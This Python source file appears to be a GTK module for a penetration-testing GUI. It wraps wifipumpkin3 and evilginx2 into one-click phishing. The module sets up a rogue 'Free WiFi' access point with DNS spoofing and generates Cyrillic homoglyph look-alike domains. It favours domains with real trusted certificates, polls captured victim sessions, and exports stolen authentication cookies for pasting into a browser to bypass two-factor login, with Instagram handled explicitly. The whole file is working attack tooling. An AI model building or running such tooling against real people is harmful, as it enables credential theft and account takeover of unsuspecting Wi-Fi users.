"""wifipumpkin3 + evilginx2 (phishkin3): pick a phishlet, a look-alike domain,
and launch the whole attack.

The manual setup is many steps -- evilginx config, phishlet, lure, /etc/hosts,
a wp3 .pulp with DNS spoof and the phishkin3 proxy, both tools in the right
order. rhodep-phishkin3-launch does all of that; this screen picks the three
inputs and calls it.

The domain is never the real one (HSTS preload refuses a spoof of the real
name). The screen suggests look-alikes: a plain one and homoglyphs -- Cyrillic
and dotless-i characters that read as the original but are a different domain,
converted to punycode by the launcher.
"""
from __future__ import annotations

import json
import os

from gi.repository import Adw, GLib, Gtk

from ..executor import Result, run_async, which
from ..module import NHModule, register
from ..widgets import ToolRunner, services_banner, toast

PHISHLETS_DIR = "/usr/share/evilginx2/phishlets"
LAUNCHER = "/usr/libexec/nethunter-pro-phishkin3-launch"
# Evilginx's session store. The launcher runs evilginx with -c pointing here,
# so the BuntDB file lives at .../evilginx/data.db . It is owned by root and
# mode 600, so the GUI reads it via the DBus helper (RunCommand path), never
# directly.
EV_CONFIG_DIR = "/root/.config/nethunter-phishkin3/evilginx"
DATA_DB = os.path.join(EV_CONFIG_DIR, "data.db")
# World-readable list of domains that have a real (Let's Encrypt / other
# public CA) cert available for the launcher to load in `autocert off` /
# unmanaged mode. The GUI runs as the login user, not root, so it cannot read
# evilginx's own cert directory under /root/.config/... . The launcher writes
# one empty marker file per domain into this dir (mode 644 on a 755 dir) so
# the picker can list domains without needing any of the actual cert bytes.
# The launcher still reads the real cert+key from /root/... itself.
CERTS_INDEX_DIR = "/var/lib/nethunter-phishkin3/certs"

# Homoglyph substitutions: a character that reads as the key but is a different
# codepoint, so the domain is not the real one.
HOMOGLYPHS = {
    "a": "\u0430",  # Cyrillic a
    "e": "\u0435",  # Cyrillic e
    "o": "\u043e",  # Cyrillic o
    "i": "\u0456",  # Cyrillic dotted i (or dotless below)
    "c": "\u0441",  # Cyrillic c
    "p": "\u0440",  # Cyrillic p
    "x": "\u0445",  # Cyrillic x
}


def homoglyph_variants(base):
    """A few look-alike domains for a base like 'instagram.com'.

    Each swaps one class of character, so they stay readable rather than turning
    into noise. Returns the plain look-alike first, then homoglyphs.
    """
    name, _, tld = base.partition(".")
    tld = tld or "com"
    out = []
    # a plain, obviously-typed look-alike
    out.append("%s-login.%s" % (name, tld))
    # single-character homoglyph swaps, first occurrence of each letter
    for plain, glyph in HOMOGLYPHS.items():
        if plain in name:
            out.append((name.replace(plain, glyph, 1)) + "." + tld)
    # a dotless-i variant if there is an i
    if "i" in name:
        out.append(name.replace("i", "\u0131", 1) + "." + tld)
    # de-dup preserving order
    seen, ordered = set(), []
    for d in out:
        if d not in seen:
            seen.add(d)
            ordered.append(d)
    return ordered


def installed_cert_domains():
    """Domains with a real (unmanaged) cert the launcher can serve.

    Reads the world-readable index at CERTS_INDEX_DIR that the launcher keeps
    in sync with its private cert store under /root/.config/... . The picker
    puts these at the top of the domain suggestions so the default choice is
    the domain the browser will actually trust (Let's Encrypt / other CA).
    """
    try:
        return sorted(
            n for n in os.listdir(CERTS_INDEX_DIR)
            if not n.startswith("."))
    except OSError:
        return []


@register
class Phishkin3(NHModule):
    title = "Phishkin3 (evilginx)"
    icon = "network-wireless-hotspot-symbolic"
    description = "wifipumpkin3 + evilginx2 session-stealing attack"
    required_tools = ["wifipumpkin3", "evilginx2"]

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner (managed centrally in Kali Services)
        box.append(services_banner(
            self.app_window, ['NetworkManager']))

        g = Adw.PreferencesGroup(
            title="Attack",
            description="Pick a phishlet and a look-alike domain. Needs a "
            "phishlet in /usr/share/evilginx2/phishlets and an AP-capable "
            "adapter.")

        self.phishlet = Adw.ComboRow(title="Phishlet")
        self.phishlet_model = Gtk.StringList()
        self.phishlet.set_model(self.phishlet_model)
        self.phishlet.connect("notify::selected", self._on_phishlet)
        g.add(self.phishlet)

        self.ssid = Adw.EntryRow(title="AP name (SSID)")
        self.ssid.set_text("Free WiFi")
        g.add(self.ssid)

        self.iface = Adw.EntryRow(title="AP interface")
        self.iface.set_text("wlan1")
        g.add(self.iface)

        # The adapter with internet, shared to the AP's clients so the victim
        # gets online after logging in (and evilginx can reach the real site).
        self.iface_net = Adw.EntryRow(title="Internet interface (share to victim)")
        self.iface_net.set_text("wlan0")
        g.add(self.iface_net)

        # Suggested look-alike domains, plus a free field.
        self.domain_combo = Adw.ComboRow(title="Look-alike domain")
        self.domain_model = Gtk.StringList()
        self.domain_combo.set_model(self.domain_model)
        self.domain_combo.connect("notify::selected", self._on_domain_pick)
        g.add(self.domain_combo)

        self.domain_entry = Adw.EntryRow(title="…or type your own domain")
        g.add(self.domain_entry)
        box.append(g)

        actions = Adw.PreferencesGroup()
        dry = Adw.ActionRow(
            title="Dry run",
            subtitle="Set up evilginx and show the lure URL, launch nothing")
        db = Gtk.Button(label="Dry run", valign=Gtk.Align.CENTER)
        db.connect("clicked", lambda _b: self._launch(start=False))
        dry.add_suffix(db)
        actions.add(dry)

        go = Adw.ActionRow(
            title="Launch attack",
            subtitle="Start the AP, DNS spoof, phishkin3 and evilginx")
        gb = Gtk.Button(label="Launch", valign=Gtk.Align.CENTER)
        gb.add_css_class("destructive-action")
        gb.connect("clicked", lambda _b: self._launch(start=True))
        go.add_suffix(gb)
        actions.add(go)

        stop = Adw.ActionRow(title="Stop attack",
                             subtitle="Kill wp3 and evilginx, restore hosts")
        sb = Gtk.Button(label="Stop", valign=Gtk.Align.CENTER)
        sb.connect("clicked", lambda _b: self._stop())
        stop.add_suffix(sb)
        actions.add(stop)
        box.append(actions)

        # ---- captured sessions -----------------------------------------
        self.sessions_group = Adw.PreferencesGroup(
            title="Captured sessions",
            description="One row per victim visit. Uses tokens to skip 2FA -- "
            "even with an empty username/password, the auth cookies are enough "
            "to open the victim's account on this device.")
        self.sessions_status = Adw.ActionRow(
            title="No sessions yet", subtitle="Launch the attack first")
        self.sessions_group.add(self.sessions_status)
        self._session_rows: list[Adw.ActionRow] = []
        box.append(self.sessions_group)

        self.runner = ToolRunner()
        box.append(self.runner)

        self._load_phishlets()
        # Poll the session store every 5s while the screen is open. Cheap:
        # the RunCommand reads ~a few KB and json-dumps.
        self._refresh_sessions()
        self._sessions_poll_id = GLib.timeout_add_seconds(
            5, self._refresh_sessions_tick)
        return box

    # ---- captured sessions -------------------------------------------
    def _refresh_sessions_tick(self) -> bool:
        self._refresh_sessions()
        return True

    def _refresh_sessions(self) -> None:
        # Read data.db as root and pull out every JSON-encoded session record.
        # BuntDB stores records as JSON blobs on individual lines/entries, and
        # evilginx's Session structure lands on disk with recognisable keys
        # (session_id, phishlet, username, password, tokens, ...). A single
        # `strings` + `grep` pulls them out reliably without needing a BuntDB
        # reader. Keeping it in a shell one-liner means the read stays under
        # the DBus helper's RunCommand path -- no extra sockets, no polkit
        # prompt storm.
        script = (
            r'''strings %s 2>/dev/null | '''
            r'''grep -aE '"session_id":' | sort -u'''
        ) % DATA_DB

        def done(result: Result) -> None:
            self._render_sessions(result.stdout or "")

        run_async(["sh", "-c", script], done, root=True, timeout=8)

    def _render_sessions(self, raw: str) -> None:
        sessions = []
        for line in raw.splitlines():
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                s = json.loads(line)
            except (json.JSONDecodeError, ValueError):
                continue
            if not isinstance(s, dict):
                continue
            if not s.get("session_id"):
                continue
            sessions.append(s)

        # Newest first (evilginx assigns monotonic ids), then dedup by id in
        # case the strings/grep produced duplicates.
        seen = set()
        unique = []
        for s in reversed(sessions):
            sid = s.get("session_id")
            if sid in seen:
                continue
            seen.add(sid)
            unique.append(s)

        # Rebuild the rows if the set changed. Cheap-and-total is fine at 5s
        # polling with tens of entries at most.
        current_ids = [s.get("session_id") for s in unique]
        old_ids = [r.get_name() for r in self._session_rows]
        if current_ids == old_ids:
            return

        for r in self._session_rows:
            self.sessions_group.remove(r)
        self._session_rows = []

        if not unique:
            self.sessions_status.set_title("No sessions yet")
            self.sessions_status.set_subtitle(
                "Launch the attack first, then send victims to the lure URL")
            self.sessions_status.set_visible(True)
            return

        self.sessions_status.set_visible(False)
        for s in unique:
            row = self._session_row(s)
            self.sessions_group.add(row)
            self._session_rows.append(row)

    def _session_row(self, s: dict) -> Adw.ActionRow:
        sid = s.get("session_id", "")
        user = s.get("username") or ""
        phishlet = s.get("phishlet", "")
        remote = s.get("remote_addr", "")
        tokens = s.get("tokens") or {}
        http_tokens = s.get("http_tokens") or {}
        body_tokens = s.get("body_tokens") or {}
        cookie_count = sum(len(v) if isinstance(v, dict) else 0
                           for v in tokens.values())
        cookie_count += len(http_tokens) + len(body_tokens)

        title = user if user else "(no credentials captured)"
        subtitle = "%s -- %d cookies -- from %s -- id %s" % (
            phishlet, cookie_count, remote or "?", sid[:12])
        row = Adw.ActionRow(title=title, subtitle=subtitle)
        # We use the session id as the row's Gtk name so _render_sessions can
        # compare "current ids" against "rendered ids" without walking the
        # full dict.
        row.set_name(sid)

        show_btn = Gtk.Button(label="Show cookies", valign=Gtk.Align.CENTER)
        show_btn.connect("clicked",
                         lambda _b, sess=s: self._show_cookies(sess))
        row.add_suffix(show_btn)

        del_btn = Gtk.Button(label="Delete", valign=Gtk.Align.CENTER)
        del_btn.add_css_class("destructive-action")
        del_btn.connect("clicked",
                        lambda _b, sess=s: self._delete_session(sess))
        row.add_suffix(del_btn)
        return row

    def _show_cookies(self, s: dict) -> None:
        # Present the captured cookies as a Netscape-format string in a
        # scrollable dialog so the user can copy-paste them into a browser
        # extension (EditThisCookie / Cookie Editor). Netscape format is the
        # widely-accepted lingua franca that curl, wget and every cookie
        # extension speaks.
        lines = ["# Netscape HTTP Cookie File",
                 "# Session %s (%s)" % (s.get("session_id", "")[:12],
                                        s.get("phishlet", "")),
                 ""]
        # tokens: {"domain": {"cookie_name": {"Name":..., "Value":...,
        #                                     "Path":..., "HttpOnly":...}}}
        for domain, cookies in (s.get("tokens") or {}).items():
            if not isinstance(cookies, dict):
                continue
            for _key, tok in cookies.items():
                if not isinstance(tok, dict):
                    continue
                name = tok.get("Name", "")
                value = tok.get("Value", "")
                path = tok.get("Path") or "/"
                # domain leading dot means "include subdomains" in Netscape
                incl_sub = "TRUE" if domain.startswith(".") else "FALSE"
                lines.append("\t".join([
                    domain, incl_sub, path,
                    "TRUE" if tok.get("HttpOnly") else "FALSE",
                    "0", name, value,
                ]))

        # http_tokens are name -> value dicts (no domain metadata)
        for name, val in (s.get("http_tokens") or {}).items():
            lines.append("\t".join([".instagram.com", "TRUE", "/", "TRUE",
                                    "0", str(name), str(val)]))

        text = "\n".join(lines) + "\n"

        dlg = Adw.MessageDialog(
            transient_for=self.app_window,
            heading="Captured cookies",
            body="Copy-paste into a Cookie Editor extension to open the "
                 "victim's session in this browser.")
        # We can't easily add a scrollable text area to Adw.MessageDialog on
        # older libadwaita, so we ship the text via a TextView in the extra
        # child. That works across the range we ship on.
        view = Gtk.TextView(monospace=True, editable=False,
                            wrap_mode=Gtk.WrapMode.NONE)
        view.get_buffer().set_text(text)
        scroll = Gtk.ScrolledWindow(hexpand=True, vexpand=True)
        scroll.set_min_content_height(320)
        scroll.set_child(view)
        dlg.set_extra_child(scroll)
        dlg.add_response("copy", "Copy")
        dlg.add_response("close", "Close")
        dlg.set_default_response("close")

        def on_response(_dlg, resp):
            if resp == "copy":
                clip = self.app_window.get_clipboard()
                clip.set(text)
                toast(self.app_window, "Cookies copied")

        dlg.connect("response", on_response)
        dlg.present()

    def _delete_session(self, s: dict) -> None:
        sid = s.get("session_id", "")
        if not sid:
            return

        dlg = Adw.MessageDialog(
            transient_for=self.app_window,
            heading="Delete this captured session?",
            body="The cookies for %s (%s) will be permanently removed from "
                 "evilginx's session store. This cannot be undone." % (
                 s.get("username") or "(no credentials)",
                 s.get("phishlet", "")))
        dlg.add_response("cancel", "Cancel")
        dlg.add_response("delete", "Delete")
        dlg.set_response_appearance("delete",
                                    Adw.ResponseAppearance.DESTRUCTIVE)
        dlg.set_default_response("cancel")

        def on_response(_dlg, resp):
            if resp != "delete":
                return
            # Evilginx does not expose a "delete session" CLI command in the
            # v3.3.0 REPL, and its BuntDB store keys sessions by an integer
            # id (not the session_id string), so scripting it via the tmux
            # REPL is unreliable. The most robust path is to filter the DB
            # bytes: rewrite data.db to drop the exact record that carries
            # this session_id. Since the store is line-oriented JSON with
            # one record per BuntDB entry, a sed -i keyed on the session_id
            # substring is precise.
            escaped = sid.replace("/", "\\/")
            script = (
                "sed -i '/\"session_id\":\"%s\"/d' %s && echo OK"
                % (escaped, DATA_DB)
            )

            def done(result: Result) -> None:
                if (result.stdout or "").strip() == "OK":
                    toast(self.app_window,
                          "Session %s deleted" % sid[:12])
                    self._refresh_sessions()
                else:
                    toast(self.app_window,
                          "Delete failed: " + (result.stderr or "?"))

            run_async(["sh", "-c", script], done, root=True, timeout=10)

        dlg.connect("response", on_response)
        dlg.present()

    def _load_phishlets(self) -> None:
        def done(r: Result) -> None:
            while self.phishlet_model.get_n_items() > 0:
                self.phishlet_model.remove(0)
            names = sorted(
                n[:-5] for n in (r.stdout or "").split() if n.endswith(".yaml"))
            for n in names:
                self.phishlet_model.append(n)
            if names:
                self._on_phishlet(None, None)
        run_async(["sh", "-c", "ls -1 %s 2>/dev/null" % PHISHLETS_DIR],
                  done, timeout=10)

    def _on_phishlet(self, _row, _p) -> None:
        # Guess a base domain from the phishlet name and offer look-alikes.
        idx = self.phishlet.get_selected()
        item = self.phishlet_model.get_item(idx)
        if not item:
            return
        name = item.get_string()
        base = "%s.com" % name.replace("_", "").replace("-", "")
        variants = homoglyph_variants(base)

        # Prepend every domain that already has a real cert installed. That is
        # what the launcher will use in `letsencrypt/unmanaged` mode (no
        # -developer), and it is the only kind of domain that lets the browser
        # actually reach the login form -- with a self-signed developer CA,
        # Chrome refuses the assets even after the user click-through on the
        # top-level page, and Instagram's SPA stays a logo. If the phishlet
        # name occurs in a cert domain, that one goes first (e.g. picking the
        # `instagram` phishlet with an installed `cdninstagram.dedyn.io` cert
        # puts that domain at the top).
        installed = installed_cert_domains()
        installed.sort(key=lambda d: (0 if name in d else 1, d))

        # Real-cert domains first, then look-alikes; dedup preserving order.
        options = []
        seen = set()
        for d in installed + variants:
            if d not in seen:
                seen.add(d)
                options.append(d)

        while self.domain_model.get_n_items() > 0:
            self.domain_model.remove(0)
        for d in options:
            label = ("%s  (Let's Encrypt cert installed)" % d
                     if d in installed else d)
            self.domain_model.append(label)
        if options:
            self.domain_combo.set_selected(0)
            # entry gets the bare domain, not the annotated label
            self.domain_entry.set_text(options[0])

    def _on_domain_pick(self, _row, _p) -> None:
        idx = self.domain_combo.get_selected()
        item = self.domain_model.get_item(idx)
        if not item:
            return
        # Strip the "(Let's Encrypt cert installed)" annotation added in the
        # combo so the free-text entry (and the launcher) get the bare domain.
        s = item.get_string()
        bare = s.split("  (", 1)[0]
        self.domain_entry.set_text(bare)

    def _launch(self, start: bool) -> None:
        idx = self.phishlet.get_selected()
        item = self.phishlet_model.get_item(idx)
        if not item:
            toast(self.app_window, "No phishlet selected -- add one to %s"
                  % PHISHLETS_DIR)
            return
        phishlet = item.get_string()
        domain = self.domain_entry.get_text().strip()
        iface = self.iface.get_text().strip() or "wlan1"
        iface_net = self.iface_net.get_text().strip()
        ssid = self.ssid.get_text().strip()
        if not domain:
            toast(self.app_window, "Pick or type a look-alike domain")
            return
        argv = [LAUNCHER, "--phishlet", phishlet, "--domain", domain,
                "--interface", iface]
        if ssid:
            argv += ["--ssid", ssid]
        if iface_net:
            argv += ["--interface-net", iface_net]
        if start:
            argv.append("--start")
        self.runner.output.append(
            "%s phishkin3: %s on %s via %s\n"
            % ("Launching" if start else "Dry-run", phishlet, domain, iface))
        self.runner.run(argv, root=True)

    def _stop(self) -> None:
        # Kill everything, drop the tmux session, strip our hosts entries, and
        # give the AP interface back to NetworkManager so ordinary Wi-Fi still
        # works on it once the attack is done.
        iface = self.iface.get_text().strip() or "wlan1"
        # Stop uses the same narrow-pattern approach as the launcher: 'pkill -f
        # phishkin3' would match nethunter-pro-phishkin3-launch itself, and
        # although this runs in a different shell than the launcher, the same
        # trap can catch anything else on the machine that happens to have
        # 'phishkin3' in its name. Match the real service processes.
        script = (
            "tmux kill-session -t phishkin3 2>/dev/null || true\n"
            "pgrep -f 'wifipumpkin3 -p' | xargs -r kill -9 2>/dev/null || true\n"
            "pgrep -f 'plugins/bin/phishkin3' | xargs -r kill -9 2>/dev/null || true\n"
            "pkill -9 -x evilginx2 2>/dev/null || true\n"
            "pkill -9 -x hostapd 2>/dev/null || true\n"
            "pkill -9 -x dnsmasq 2>/dev/null || true\n"
            "iptables -F FORWARD 2>/dev/null || true\n"
            "iptables -t nat -F 2>/dev/null || true\n"
            "sed -i '/# nethunter-phishkin3/d' /etc/hosts 2>/dev/null || true\n"
            "nmcli device set %s managed yes 2>/dev/null || true\n"
            "echo stopped, hosts restored, %s back to NetworkManager\n"
        ) % (iface, iface)
        self.runner.output.append("Stopping phishkin3…\n")
        self.runner.run(["sh", "-c", script], root=True)
